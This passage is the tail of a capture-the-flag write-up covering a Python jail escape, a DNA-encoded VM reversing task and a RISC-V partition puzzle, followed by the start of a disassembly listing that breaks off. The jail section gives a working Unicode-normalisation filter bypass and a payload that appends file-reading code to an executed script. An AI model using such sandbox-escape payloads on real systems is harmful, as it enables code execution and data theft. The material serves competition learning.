which characters are concretely allowed at which offsets. It suffices to only visualise positions 0, 1, 2, and 3, because the pattern repeats (`i % 2` and `i % 4`). If we stick to only ASCII characters, we get these options:\n\n```\ni % 4 == 0: ! # % ' ) + - / 1 3 5 7 9 ; = ? A C E G I K M O Q S U W Y [ ] _ a c e g i k m o q s u w y { } \ni % 4 == 1:  \" $ & ( * , . 0 2 4 6 8 : < > @ B D F H J L N P R T V X Z \\ ^ ` b d f h j l n p r t v x z | ~\ni % 4 == 2: !     '     -     3     9     ?     E     K     Q     W     ]     c     i     o     u     {\ni % 4 == 3:    $   (   ,   0   4   8   <   @   D   H   L   P   T   X   \\   `   d   h   l   p   t   x   |\n```\n\nSuffice to say, this is rather limiting! At a quick glance it seems we cannot use any of:\n\n- `__` (dunder): common in Python jail escapes;\n- `input`\n- `eval`\n- `exec`\n\nOn the other hand, `open` would be allowed, but only at `i % 4 == 2`.\n\n```\ni % 4 == 2: !     '     -     3     9     ?     E     K     Q     W     ]     c     i    <o>    u     {\ni % 4 == 3:    $   (   ,   0   4   8   <   @   D   H   L   P   T   X   \\   `   d   h   l  <p>  t   x   |\ni % 4 == 0: ! # % ' ) + - / 1 3 5 7 9 ; = ? A C E G I K M O Q S U W Y [ ] _ a c<e>g i k m o q s u w y { } \ni % 4 == 1:  \" $ & ( * , . 0 2 4 6 8 : < > @ B D F H J L N P R T V X Z \\ ^ ` b d f h j l<n>p r t v x z | ~\n```\n\nTo gain a better idea of which keywords or Python builtins we might be able to use without manually looking through the diagram above, we wrote a [script](scripts/offset-builtins.py):\n\n```\ni % 4 == 3: dir\ni % 4 == 3: hex\ni % 4 == 0: id\ni % 4 == 2: id\ni % 4 == 2: iter\ni % 4 == 3: len\ni % 4 == 2: open\ni % 4 == 1: zip\ni % 4 == 0: if\ni % 4 == 3: def\ni % 4 == 0: while\ni % 4 == 0: in\ni % 4 == 0: write\n```\n\nThat's not a lot. Even though the `open` is still promising, we can't `read`. We explored some of these: perhaps iterating through an open file? But an issue still remained: the flag was placed in a randomised path, so we need to somehow list the files in the app directory first.\n\nFortunately, we came across Shirajuki's [PyJail cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet), specifically the \"Unicode bypass\" section. After all, the filter checks for the *bytes* of our input. This is useful since it turns out Python is quite lenient about what it considers an identifier, and moreover, interprets many Unicode codepoints as the same as their ASCII counterparts. For example:\n\n```python\n>>> hello = 123\n>>> 𝓱𝓮𝓵𝓵𝓸\n123\n```\n\nIn the above, `𝓱𝓮𝓵𝓵𝓸` is considered the same identifier as `hello` due to [NFKC normalisation](https://www.unicode.org/reports/tr15/).\n\nWe wrote [another script](scripts/offset-builtins2.py) that looks for all possible Unicode codepoints that normalise to an ASCII letter, then uses these equivalences to search for builtins again:\n\n```\nbin: [(1, 'bi𝔫'), (1, 'bi𝖓')]\nchr: [(2, 'c𝒽𝐫'), (2, 'c𝒽𝒓'), (2, 'c𝔥𝐫'), (2, 'c𝔥𝒓'), (2, 'c𝖍𝐫'), (2, 'c𝖍𝒓')]\ndir: [(1, 'di𝐫'), (1, 'di𝒓'), (3, 'dir')]\nfilter: [(1, 'fi𝐥ter'), (1, 'fi𝒍ter')]\nhex: [(3, 'hex')]\nid: [(0, 'id'), (2, 'id'), (2, 'i𝖽'), (2, 'i𝘥'), (2, 'i𝚍')]\ninput: [(2, 'i𝔫put'), (2, 'i𝖓put')]\nint: [(2, 'i𝔫t'), (2, 'i𝔫𝔱'), (2, 'i𝔫𝖙'), (2, 'i𝔫𝘁'), (2, 'i𝖓t'), (2, 'i𝖓𝔱'), (2, 'i𝖓𝖙'), (2, 'i𝖓𝘁')]\niter: [(2, 'iter')]\nlen: [(3, 'len')]\nmap: [(1, 'ⓜap')]\nmax: [(1, 'ⓜax')]\nmin: [(1, 'ⓜin')]\nopen: [(2, 'open')]\nord: [(2, 'o𝐫d'), (2, 'o𝐫𝖽'), (2, 'o𝐫𝘥'), (2, 'o𝐫𝚍'), (2, 'o𝒓d'), (2, 'o𝒓𝖽'), (2, 'o𝒓𝘥'), (2, 'o𝒓𝚍')]\npow: [(3, 'poʷ')]\nsorted: [(0, 'ˢo𝐫ted'), (0, 'ˢo𝒓ted')]\nsum: [(0, 'sⓤm')]\nsuper: [(0, 'ˢuper')]\ntuple: [(1, 'tu𝘱le'), (1, 'tu𝚙le')]\nzip: [(1, 'zip'), (1, 'zi𝘱'), (1, 'zi𝚙')]\nwrite: [(0, 'write')]\n```\n\nNote that some of the above are actually not accepted by Python. In particular, the circled letters (e.g., i `ⓜax`) cause a `SyntaxError`. Nevertheless, we have a bit more choice, and in particular access to `input`. At this point we tried to combine the builtins to something useful. Another hitch we came across was whitespace: spaces are only allowed on odd offsets. Combining multiple lines was also a pain due to Python's indentation rules. After some trial and error, we had something like this:\n\n```python\nx = \"\".join([\n    \"if-456\\t \\t:\\t \\t\\n\",\n    \"\\t \\t \\t@\\t i𝔫put\\t #\\n\",\n    \"\\t \\t \\t@ˢo𝐫ted\\t #\\n\",\n    \"\\t \\t \\t@\\t open\\t #\\n\",\n    \"\\t \\t \\t@\\t i𝔫put\\t #\\n\",\n    \"\\t \\t \\tdef\\td\\t(cd):3\",\n])\n```\n\nThis uses [decorators](https://docs.python.org/3/glossary.html#term-decorator) to execute functions without having to worry about matching parentheses. The string could be further minimised, but the more important problem is that Python asks for our string using `input`, so we cannot actually send newlines...\n\nBut, using the same general set of operations and facing the problem of properly positioning paretheses after all, we got to:\n\n```python\nx = \"\".join([\n    \"[ \\t \",\n    \"\\t open\\t \",\n    \"\\t(\\t \",\n    \"\\t i𝔫put\\t \",\n    \"\\t(\\t \",\n    \"),\\t \",\n    \"\\t i𝔫put\\t \",\n    \"\\t(\\t \",\n    \") \\t \",\n    \") \\t \",\n    \"\\t.\\t \",\n    \"write(\\t \",\n    \"\\t i𝔫put\\t \",\n    \"\\t(\\t \",\n    \"\\t \\t \",\n    \") \\t \",\n    \") \\t \",\n    \"]\",\n])\n```\n\nNote the use of alternating tabs and spaces as padding, after wrapping everything in a pair of braces to avoid Python complaining about the leading indentation. The (UTF-8-encoded) length of each component above is a multiple of 4.\n\nWhat this actually executes is this code:\n\n```python\n[open(input(), input()).write(input())]\n```\n\nThat is, we open a file and write data to it, and we provide three more strings over additional lines:\n\n- the path to the file,\n- the mode to `open` it in, and\n- the data to write to it.\n\nGreat! So why is this useful?\n\nAt the very beginning we noticed that the Python file starts with a shebang. As it turns out, the challenge setup is somewhat funky, because of these lines in the `Dockerfile`:\n\n```dockerfile\n  FROM python:3.13-slim as app\n> COPY main.py /srv/app/run\n> RUN chmod +x /srv/app/run\n  COPY flag.txt /srv/app/\n  RUN mv /srv/app/flag.txt /srv/app/flag_$(dd if /dev/urandom bs=16 count=1 | xxd -p).txt\n  RUN apt-get update\n  RUN apt-get install -y socat\n> ENTRYPOINT socat TCP-LISTEN:5000,fork,reuseaddr,bind=0.0.0.0 EXEC:\"/srv/app/run\"\n```\n\nThe Python file is copied into the container as `/srv/app/run`, its `x` bit is set, then `socat` listens to connections and handles them by directly executing `/srv/app/run`. With the writing gadget we set up above, we can alter the content of `/srv/app/run` as we see fit. For example, we can:\n\n- connect to the (unmodified) remote,\n- provide our encoded `[open(input(), input()).write(input())]` code,\n- provide `/srv/app/run` as the file path,\n- provide `a` as the mode (append, keeping the original content),\n- provide `;import os;print([open(\"/srv/app/\" + f).read() for f in os.listdir(\"/srv/app\") if f.startswith(\"flag\")])` as the data\n\nAt this point, the Python script is extended with code that will print a flag, whatever its exact filename is. We only need to reconnect again and provide any values to the `input`s. (There are more elegant ways to make use of the overwritable script, but alas.)\n\n`.;,;.{lol_this_was_written_in_2023}`\n\n## 156 Reversing / DNA\n\n**Description**\n\ndeoxy ribo nucleic acid deoxy meaning without oxygen ribo meaning the 5-carbon sugar backbone nucleic meaning of the nucleus acid meaning proton donor\n\n**Files provided**\n\n- [`dna.tar.gz`](files/dna.tar.gz)\n\n**Solution**\n\n\nWe are given two files: a `.pyc` file (containing compiled Python bytecode) and a `.dna` file which contains a lot of text restricted to the letters of DNA: `A`, `T`, `G`, and `C`. The bytecode file called `main.cpython-310.pyc`: the exact version, CPython 3.10, comes into play later.\n\nTo begin with, we decompiled the bytecode using a combination of [Pylingual](https://www.pylingual.io/) and `pycdc` (also available online [here](https://www.lddgo.net/en/string/pyc-compile-decompile)). Most of the decompile was clean enough except for cleaning up the `match` statement, resulting in this code (full version [here](files/dna-decompiled.py)):\n\n```python\nimport marshal\nimport sys\ns = []\nm = {}\nnm = {'A': 0, 'T': 1, 'G': 2, 'C': 3}\nunlucky = [ ... ]\ntrans = lambda s: sum((nm[c] << 2 * i for i, c in enumerate(s)))\nif len(sys.argv)!= 2:\n    print(f'Usage: {sys.argv[0]} <dna_file>')\n    sys.exit(1)\ncode = open(sys.argv[1]).read()\nflag = input('> ').encode()\nif len(flag)!= 56:\n    exit('WRONG!')\nif flag[:6]!= b'.;,;.{':\n    exit('WRONG!')\nif flag[(-1)]!= 125:\n    exit('WRONG!')\nflag = flag[6:(-1)]\nfor i in range(len(flag)):\n    m[640 + i] = flag[i]\npc = 0\nwhile pc < len(code):\n    pri, pro = map(trans, [code[pc:pc + 2], code[pc + 2:pc + 12]])\n    match pri:\n        case 0:\n            s.append(pro)\n            pc += 12\n        case 1:\n            if not s:\n                raise Exception('Stack underflow')\n            s.pop()\n            pc += 2\n        case 2:\n            if pro not in m:\n                raise Exception(f'Uninitialized memory access at {pro}')\n            s.append(m[pro])\n            pc += 12\n        case 3:\n            if not s:\n                raise Exception('Stack underflow')\n            m[pro] = s.pop()\n            pc += 12\n        case 4:\n            if len(s) < 2:\n                raise Exception('Stack underflow')\n            a, b = (s.pop(), s.pop())\n            s.append(a + b)\n            pc += 2\n        # ...\n        case 15:\n            break\n```\n\nFor the most part, this is a simple virtual machine with 16 opcodes. The VM uses:\n\n- `code`: bytecode, coming from the `.dna` file (see later);\n- `pc`: program counter, initialised to `0`;\n- `s`: stack of integer values, initially empty;\n- `m`: memory mapping integers to integers, initially empty except for the 49 flag characters (after stripping the prefix and suffix) stored at offsets `640` to `688`.\n\nThe opcodes are:\n\n| opcode | immediate | pseudocode | description |\n| --- | --- | --- | --- |\n| 0 | Y | `push(imm)` | push immediate to stack |\n| 1 |   | `pop()` | pop/discard top of stack |\n| 2 | Y | `push(mem[imm])` | push value to stack from memory (at immediate address) |\n| 3 | Y | `mem[imm] := pop()` | pop value from stack to memory (at immediate address) |\n| 4 |   | `push(pop() + pop())` | pop 2 values from stack, push their sum |\n| 5 |   | `push(pop() - pop())` | pop 2 values from stack, push their difference |\n| 6 |   | `push(pop() * pop())` | pop 2 values from stack, push their product |\n| 7 |   | `push(pop() % pop())` | pop 2 values from stack, push the remainder of their division |\n| 8 |   | `push(pop() == pop())` | pop 2 values from stack, push 1 if they are equal, 0 otherwise |\n| 9 | Y | `goto(imm)` | unconditionally jump to immediate address |\n| 10 | Y | `if pop() == 1: goto(imm)` | pop value from stack, jump to immediate address if it was `1` |\n| 11 | Y | `if pop() != 1: goto(imm)` | pop value from stack, jump to immediate address if it was not `1` |\n| 12 |   | `print(pop())` | pop value from stack, print it as a single character |\n| 13 |   | `exec(pop())` | pop value from stack, use it to decrypt and execute a special function |\n| 14 |   | `swap_mapping(pop(), pop())` | pop 2 values from stack, swap the letter mapping for the corresponding values |\n| 15 |   | `halt()` | stop execution |\n\nThe `.dna` file contains the letters `A`, `T`, `G`, and `C`. These are actually mapped into opcodes and integer values using the `nm` mapping, which is initially `{'A': 0, 'T': 1, 'G': 2, 'C': 3}`. Since there are four possible values for the letter, the mapping gives us 2 bits at a time. The `trans` function accepts a string of letters and converts them to an integer. It uses the current `nm` mapping to map letters to bits, and it concatenates bits as expected (so a 3-letter string turns into `3 * 2 == 6` bit integer).\n\nThe `swap_mapping` instruction (although never actually used in the given `.dna` file!) is our first hint that the `nm` mapping will not remain constant throughout the execution of the code. When this instruction is executed, the rest of the file has to be decoded using a different interpretation.\n\nAfter writing a [disassembler](scripts/dna-decompiler/src/dis.rs), we can see big blocks with many multiplication and addition operations:\n\n```\n      ; section at 00000, coding: [0, 1, 2, 3]\n00000 : GAAAAGGAAAAA     push(mem[#0280])\n0000c : AAGGGTAAAAAA     push(#0000006a)\n00018 : GT               push(pop() * pop())\n0001a : GATAAGGAAAAA     push(mem[#0281])\n00026 : AACGTAAAAAAA     push(#0000001b)\n00032 : GT               push(pop() * pop())\n00034 : GAGAAGGAAAAA     push(mem[#0282])\n00040 : AAACAGAAAAAA     push(#0000008c)\n0004c : GT               push(pop() * pop())\n0004e : GACAAGGAAAAA     push(mem[#0283])\n0005a : AAGGAGAAAAAA     push(#0000008a)\n00066 : GT               push(pop() * pop())\n00068 : GAATAGGAAAAA     push(mem[#0284])\n00074 : AAACGTAAAAAA     push(#0000006c)\n00080 : GT               push(pop() * pop())\n        ...\n004e0 : GAAACGGAAAAA     push(mem[#02b0])\n004ec : AATAGGAAAAAA     push(#000000a1)\n004f8 : GT               push(pop() * pop())\n004fa : AT               push(pop() + pop())\n004fc : AT               push(pop() + pop())\n004fe : AT               push(pop() + pop())\n00500 : AT               push(pop() + pop())\n00502 : AT               push(pop() + pop())\n00504 : AT               push(pop() + pop())\n00506 : AT               push(pop() + pop())\n        ...\n00558 : AT               push(pop() + pop())\n0055a : CAAAAAAATAAA     mem[#1000] := pop()\n00566 : GAAAAGGAAAAA     push(mem[#0280])\n00572 : AAAGCAAAAAAA     push(#00000038)\n0057e : GT               push(pop() * pop())\n        ...\n```\n\nEventually we hit our first `exec` instruction, after which the bytecode does not make sense anymore, indicating that the letter coding may have been changed by the instruction as well.\n\n```\n        ...\n03b52 : AT               push(pop() + pop())\n03b54 : AT               push(pop() + pop())\n03b56 : CAAGGAAATAAA     mem[#1028] := pop()\n03b62 : GAGGTGGAAAAA     push(mem[#029a])\n03b6e : TC               exec(pop())\n```\n\nThe VM interprets `exec` as follows:\n\n```python\n        case 13:\n            if not s:\n                raise Exception('Stack underflow')\n            key = s.pop()\n            def f():\n                return\n            f.__code__ = marshal.loads(bytes([b ^ key for b in unlucky.pop(0)]))\n            f()\n            pc += 2\n```\n\nWhere `unlucky` is an array of four bytestrings embedded in the original `.pyc` file. After taking the next available `unlucky` bytestring, it XOR's each byte with the decryption key, coming from the stack, then it deserialises the data (using the native [`marshal` module](https://docs.python.org/3/library/marshal.html)) and uses it as the bytecode for a function, which is immediately called. In the `.dna` disassembly above, we can see that the value passed to `exec` is `mem[0x029A]`, which was initially set to `flag[26]`. This means that by finding the correct decryption key should also let us know one byte of the flag.\n\nWe could try to find correct decryption keys by checking every possible ASCII byte and seeing if Python successfully deserialises the data *and* allows the result to be assigned to `f` (i.e., the deserialised data is actually code). Invalid bytestrings might raise exception for either step. As it turns out (after some bruteforcing and manual inspection), there is a simpler way to obtain the correct keys: after decryption, all four bytestrings contain the string `unlucky`, presumably used to indicate the location in error messages.\n\nThe correct keys for the `unlucky` bytestrings are `111`, `117`, `105`, `97`.\n\nHowever, even with the correct keys, we have to make sure that we use the correct version of Python (CPython 3.10), otherwise `marshal` will not deserialise the bytestring correctly.\n\nThe decrypted functions vary in complexity but in the end only modify `nm`, the mapping of letters to bits. The last `unlucky` function seems to be the most complex (and we didn't completely decompile it during the CTF), but it also seems to be the only one that doesn't end up modifying `nm`. We can step through the execution of the VM and keep track of `nm` after each `exec` instruction:\n\n- initial value: `{'A': 0, 'T': 1, 'G': 2, 'C': 3}`\n- after `unlucky[0]`: `{'A': 1, 'T': 2, 'G': 3, 'C': 0}`\n- after `unlucky[1]`: `{'A': 3, 'T': 0, 'G': 2, 'C': 1}`\n- after `unlucky[2]`: `{'A': 2, 'T': 0, 'G': 1, 'C': 3}`\n- after `unlucky[3]`: `{'A': 2, 'T': 0, 'G': 1, 'C': 3}`\n\nAt this point we know some bytes of the flag and we can disassemble the entire `.dna` file. However, to get a clearer overview of what all the operations actually end up doing, and since this is a fairly simple stack machine, we also wrote a [decompiler](scripts/dna-decompiler/src/dec.rs).\n\nThe decompiler uses symbolic execution: it executes the bytecode, but its stack contains symbolic values:\n\n```rust\nenum SymVal {\n    Binop(Binop, Box<SymVal>, Box<SymVal>),\n    Const(u64),\n    FlagByte(u64),\n    MemByte(u64),\n}\n```\n\nWhen constructing `SymVal`s, binary operations on constants can be directly simplified, otherwise both operands are kept. As a result, we can see that the entire bytecode in the `.dna` file can be summarised as (full decompile [here](scripts/dna-decompiler/decomp.txt)):\n\n```\n0055a  memory[#1000] := flag[0] * 106 + flag[1] *  27 + flag[2] * 140 + ... + flag[47] * 220 + flag[48] * 161\n00ac0  memory[#1004] := flag[0] *  56 + flag[1] * 249 + flag[2] * 152 + ... + flag[47] * 231 + flag[48] *  61\n01026  memory[#1008] := flag[0] * 149 + flag[1] * 104 + flag[2] *  66 + ... + flag[47] * 156 + flag[48] * 150\n// ...\n108b2  memory[#10c0] := flag[0]  * 10 + flag[1] * 177 + flag[2] *  31 + ... + flag[47] * 186 + flag[48] * 219\n10e26  if (((mem[#1000] == 692012) + (mem[#1004] == 611030) + ... + (mem[#10c0] == 710793) == 49) != 1) goto #10ec8\n10e3e  print(\"CORRECT!\\n\")\n10eb0  goto #10f1e\n10ec8  print(\"WRONG!\\n\")\n```\n\n49 values in memory store sums of multipliying all 49 bytes of the flag by various integer constants. These are then compared to target values. In other words, we have a matrix equation of the form `Ax = b`, where `A` is a 49x49 matrix of values (the constants we use to multiply the flag bytes), `x` is our input (the flag bytes), and `b` is the target vector.\n\nAt this point we can use z3 or even better, something like `sage` (script [here](scripts/dna-solve.sage)), to invert the matrix and obtain the flag bytes.\n\n`.;,;.{we_ought_to_start_storing_our_data_as_dna_instead}`\n\n## 408 Reversing / Fruit Ninja\n\n**Description**\n\nmy friend made a custom cpu, so of course i had to make a game for it. can you win? @unvariant REMEMBER TO GIVE THEM CPU\n\n**Files provided**\n\n- [`fruitninja.tar.gz`](files/fruitninja.tar.gz)\n\n**Solution**\n\nWe are given an implementation of a CPU in Verilog, as well as a ROM file and a RAM file. After *some time* spent poring through the Verilog code...\n\n![](screens/its-riscv.png)\n\nYup, it's just [RISC-V](https://en.wikipedia.org/wiki/RISC-V) (or a small subset of it), which became obvious after searching online for instruction mnemonics found in various comments in the code (e.g., `jal`, `jalr`). Loading the `rom_file.mem` file in Ghidra (after decoding the hexdump into binary data) and loading it as RISC-V (either 32-bit or 64-bit, didn't make much difference) worked wonders.\n\nSince the binary is tiny, there is not much to reverse. We found:\n\n* the `main` function;\n* a *huge* (!) function that seems to just implement a \"modulo\" operation;\n* a hypervisor_call function, which looks like a no-op in Ghidra but causes the Verilog wrapper to actually perform some I/O operation; and\n* `readline` and `print` wrappers of the hypervisor call.\n\n<details>\n<summary>Ghidra decompilation of the `main` function, lightly cleaned up.</summary>\n\n```c\nvoid main(void) {\n  int *cmp_ptr;\n  int iVar1;\n  uint ui_pos;\n  int user_input_len;\n  int *cmp_block_ptr;\n  int errors;\n  int errors_in_block;\n  uint uVar2;\n  uint processed [50];\n  byte user_input [38];\n  byte ui_char;\n  print(\"cut my fruit in half:\");\n  user_input_len = readline(user_input);\n  if (user_input_len == 0x25) {\n    uVar2 = 0;\n    ui_pos = 0;\n    user_input[37] = 0;\n    user_input_len = 0;\n    // process input\n    do {\n      ui_char = user_input[ui_pos];\n      errors_in_block = modulo(ui_pos & 0xff,3);\n      processed[user_input_len] = (uint)ui_char << (errors_in_block << 1 & 0x1fU) & 0x3f | uVar2;\n      uVar2 = (uint)(ui_char >> ((errors_in_block << 1 ^ 6U) & 0x1f));\n      errors = user_input_len + 1;\n      if (errors_in_block == 2) {\n        errors = user_input_len + 2;\n        processed[user_input_len + 1] = uVar2;\n        uVar2 = 0;\n      }\n      ui_pos += 1;\n      user_input_len = errors;\n    } while (ui_pos != 0x26);\n    // check processed input\n    user_input_len = 0;\n    cmp_block_ptr = NULL;\n    errors = 0x32;\n    do {\n      ui_pos = 0;\n      errors_in_block = 0;\n      cmp_ptr = cmp_block_ptr;\n      do {\n        iVar1 = *cmp_ptr;\n        if (processed[user_input_len] <= ui_pos) {\n          iVar1 = -iVar1;\n        }\n        errors_in_block += iVar1;\n        ui_pos += 1;\n        cmp_ptr = cmp_ptr + 1;\n      } while (ui_pos != 0x40);\n      errors -= (uint)(errors_in_block == 0);\n      user_input_len += 1;\n      cmp_block_ptr = cmp_block_ptr + 0x40;\n    } while (user_input_len != 0x32);\n    if (errors == 0) {\n      print(\"yes\\n\");\n      return 0;\n    }\n  }\n  print(\"no\\n\");\n  return 1;\n}\n```\n\n</details>\n\nThe `main` function does the following:\n\n- asks the user for input (the flag);\n- checks that the input is 37 bytes long;\n- processes the input, turning it into 50 integers; and\n- checks that each integer is correct, referring to data in the \"RAM\".\n\nThe \"processing\" part is similar to a [Base64](https://en.wikipedia.org/wiki/Base64) encoding: every three input bytes (`3 * 8 = 24 bits`) turn into four output integers between `0` and `63 == 2**6` (`4 * 6 = 24 bits`). This is where the `modulo` operation is invoked with an argument of `3`.\n\nThe next check is more interesting. For each of the 50 integers, we execute the following inner loop, which goes through 64 iterations:\n\n```c\nfor (int i = 0; i < 64; i++) {\n    int v = *ram_data;\n    if (processed[outer_idx] <= i) {\n        v = -v;\n    }\n    errors_in_block += v;\n    ui_pos += 1;\n    ram_data = ram_data + 1;\n}\nerrors -= (uint)(errors_in_block == 0);\n```\n\n`ram_data` points to an area in the RAM which contains `3200` integers, i.e., 64 for each of our 50 integers. `v` is either set to an integer from the RAM, or else it is negated, depending on whether our processed integer is still below the current `i`. `v` is then added to an accumulator which must be `0` at the end.\n\nWe can visualise this process a bit better by imagining the RAM data as 50 row of 64 columns of numbers. Our input amounts to choosing, for each row, where to split the columns into two groups. A correct choice is one where the numbers on the left side of our split have the same sum as the numbers on the right side. Here is a smaller example with 3 rows of 8 numbers:\n\n| | | | | | | | | |\n| --- | --- | --- | --- | --- | --- | --- | --- | ---:|\n| 3 | 7 | 2 | 1 > | < 1 | 2 | 9 | 1 | *(both sides add up to 13)* |\n| 13 | 9 > | < 2 | 1 | 9 | 4 | 5 | 1 | *(here: 22)* |\n| 3 | 0 | 0 | 1 | 1 | 3 > | < 2 | 6 | *(here: 8)* |\n\nA more general form of this problem (where one chooses *any* subset of the numbers on the line to be part of one group, rather than just choosing a position in an ordered sequence) is known as [partitioning](https://en.wikipedia.org/wiki/Partition_problem).\n\nWith a [solver script](scripts/fruit-ninja-solve.py), we found the partitions and were thus able to get the original bytes:\n\n`.;,;.{PPPerfect_pr3c15e_p4rT1Ti0ning}`\n", "timestamp": "2025-10-24T11:39:34.484542"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2025-06-14-smileyCTF/scripts/dna-decompiler/decomp.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2025-06-14-smileyCTF/scripts/dna-decompiler/decomp.txt", "content": "      ; section at 00000, coding: [0, 1, 2, 3]\n00000 : GAAAAGGAAAAA     push(mem[#0280])\n0000c : AAGGGTAAAAAA     push(#0000006a)\n00018 : GT               push(pop() * pop())\n0001a : GATAAGGAAAAA     push(mem[#0281])\n00026 : AACGTAAAAAAA     push(#0000001b)\n00032 : GT               push(pop() * pop())\n00034 : GAGAAGGAAAAA     push(mem[#0282])\n00040 : AAACAGAAAAAA     push(#0000008c)\n0004c : GT               push(pop() * pop())\n0004e : GACAAGGAAAAA     push(mem[#0283])\n0005a : AAGGAGAAAAAA     push(#0000008a)\n00066 : GT               push(pop() * pop())\n00068 : GAATAGGAAAAA     push(mem[#0284])\n00074 : AAACGTAAAAAA     push(#0000006c)\n00080 : GT               push(pop() * pop())\n00082 : GATTAGGAAAAA     push(mem[#0285])\n0008e : AACGTTAAAAAA     push(#0000005b)\n0009a : GT               push(pop() * pop())\n0009c : GAGTAGGAAAAA     push(mem[#0286])\n000a8 : AACAAGAAAAAA     push(#00000083)\n000b4 : GT               push(pop() * pop())\n000b6 : GACTAGGAAAAA     push(mem[#0287])\n000c2 : AAGGAGAAAAAA     push(#0000008a)\n000ce : GT               push(pop() * pop())\n000d0 : GAAGAGGAAAAA     push(mem[#0288])\n000dc : AAGGGTAAAAAA     push(#0000006a)\n000e8 : GT               push(pop() * pop())\n000ea : GATGAGGAAAAA     push(mem[#0289])\n000f6 : AACCCTAAAAAA     push(#0000007f)\n00102 : GT               push(pop() * pop())\n00104 : GAGGAGGAAAAA     push(mem[#028a])\n00110 : AATAGGAAAAAA     push(#000000a1)\n0011c : GT               push(pop() * pop())\n0011e : GACGAGGAAAAA     push(mem[#028b])\n0012a : AACACTAAAAAA     push(#00000073)\n00136 : GT               push(pop() * pop())\n00138 : GAACAGGAAAAA     push(mem[#028c])\n00144 : AATACGAAAAAA     push(#000000b1)\n00150 : GT               push(pop() * pop())\n00152 : GATCAGGAAAAA     push(mem[#028d])\n0015e : AAAGTGAAAAAA     push(#00000098)\n0016a : GT               push(pop() * pop())\n0016c : GAGCAGGAAAAA     push(mem[#028e])\n00178 : AACCAAAAAAAA     push(#0000000f)\n00184 : GT               push(pop() * pop())\n00186 : GACCAGGAAAAA     push(mem[#028f])\n00192 : AACTCAAAAAAA     push(#00000037)\n0019e : GT               push(pop() * pop())\n001a0 : GAAATGGAAAAA     push(mem[#0290])\n001ac : AAGTGCAAAAAA     push(#000000e6)\n001b8 : GT               push(pop() * pop())\n001ba : GATATGGAAAAA     push(mem[#0291])\n001c6 : AACAAGAAAAAA     push(#00000083)\n001d2 : GT               push(pop() * pop())\n001d4 : GAGATGGAAAAA     push(mem[#0292])\n001e0 : AACATGAAAAAA     push(#00000093)\n001ec : GT               push(pop() * pop())\n001ee : GACATGGAAAAA     push(mem[#0293])\n001fa : AACTCGAAAAAA     push(#000000b7)\n00206 : GT               push(pop() * pop())\n00208 : GAATTGGAAAAA     push(mem[#0294])\n00214 : AACGGCAAAAAA     push(#000000eb)\n00220 : GT               push(pop() * pop())\n00222 : GATTTGGAAAAA     push(mem[#0295])\n0022e : AATTACAAAAAA     push(#000000c5)\n0023a : GT               push(pop() * pop())\n0023c : GAGTTGGAAAAA     push(mem[#0296])\n00248 : AAAGACAAAAAA     push(#000000c8)\n00254 : GT               push(pop() * pop())\n00256 : GACTTGGAAAAA     push(mem[#0297])\n00262 : AAAGGTAAAAAA     push(#00000068)\n0026e : GT               push(pop() * pop())\n00270 : GAAGTGGAAAAA     push(mem[#0298])\n0027c : AAACCGAAAAAA     push(#000000bc)\n00288 : GT               push(pop() * pop())\n0028a : GATGTGGAAAAA     push(mem[#0299])\n00296 : AAATACAAAAAA     push(#000000c4)\n002a2 : GT               push(pop() * pop())\n002a4 : GAGGTGGAAAAA     push(mem[#029a])\n002b0 : AAGTCTAAAAAA     push(#00000076)\n002bc : GT               push(pop() * pop())\n002be : GACGTGGAAAAA     push(mem[#029b])\n002ca : AAACTAAAAAAA     push(#0000001c)\n002d6 : GT               push(pop() * pop())\n002d8 : GAACTGGAAAAA     push(mem[#029c])\n002e4 : AATTTAAAAAAA     push(#00000015)\n002f0 : GT               push(pop() * pop())\n002f2 : GATCTGGAAAAA     push(mem[#029d])\n002fe : AATAGTAAAAAA     push(#00000061)\n0030a : GT               push(pop() * pop())\n0030c : GAGCTGGAAAAA     push(mem[#029e])\n00318 : AACTTGAAAAAA     push(#00000097)\n00324 : GT               push(pop() * pop())\n00326 : GACCTGGAAAAA     push(mem[#029f])\n00332 : AATGTCAAAAAA     push(#000000d9)\n0033e : GT               push(pop() * pop())\n00340 : GAAAGGGAAAAA     push(mem[#02a0])\n0034c : AAGTCTAAAAAA     push(#00000076)\n00358 : GT               push(pop() * pop())\n0035a : GATAGGGAAAAA     push(mem[#02a1])\n00366 : AAGTTAAAAAAA     push(#00000016)\n00372 : GT               push(pop() * pop())\n00374 : GAGAGGGAAAAA     push(mem[#02a2])\n00380 : AAATTCAAAAAA     push(#000000d4)\n0038c : GT               push(pop() * pop())\n0038e : GACAGGGAAAAA     push(mem[#02a3])\n0039a : AACCTAAAAAAA     push(#0000001f)\n003a6 : GT               push(pop() * pop())\n003a8 : GAATGGGAAAAA     push(mem[#02a4])\n003b4 : AATTGTAAAAAA     push(#00000065)\n003c0 : GT               push(pop() * pop())\n003c2 : GATTGGGAAAAA     push(mem[#02a5])\n003ce : AACAGCAAAAAA     push(#000000e3)\n003da : GT               push(pop() * pop())\n003dc : GAGTGGGAAAAA     push(mem[#02a6])\n003e8 : AACGTGAAAAAA     push(#0000009b)\n003f4 : GT               push(pop() * pop())\n003f6 : GACTGGGAAAAA     push(mem[#02a7])\n00402 : AATCGCAAAAAA     push(#000000ed)\n0040e : GT               push(pop() * pop())\n00410 : GAAGGGGAAAAA     push(mem[#02a8])\n0041c : AAGATGAAAAAA     push(#00000092)\n00428 : GT               push(pop() * pop())\n0042a : GATGGGGAAAAA     push(mem[#02a9])\n00436 : AAATATAAAAAA     push(#00000044)\n00442 : GT               push(pop() * pop())\n00444 : GAGGGGGAAAAA     push(mem[#02aa])\n00450 : AACGATAAAAAA     push(#0000004b)\n0045c : GT               push(pop() * pop())\n0045e : GACGGGGAAAAA     push(mem[#02ab])\n0046a : AACTATAAAAAA     push(#00000047)\n00476 : GT               push(pop() * pop())\n00478 : GAACGGGAAAAA     push(mem[#02ac])\n00484 : AAGGTCAAAAAA     push(#000000da)\n00490 : GT               push(pop() * pop())\n00492 : GATCGGGAAAAA     push(mem[#02ad])\n0049e : AATCGGAAAAAA     push(#000000ad)\n004aa : GT               push(pop() * pop())\n004ac : GAGCGGGAAAAA     push(mem[#02ae])\n004b8 : AATGGAAAAAAA     push(#00000029)\n004c4 : GT               push(pop() * pop())\n004c6 : GACCGGGAAAAA     push(mem[#02af])\n004d2 : AAACTCAAAAAA     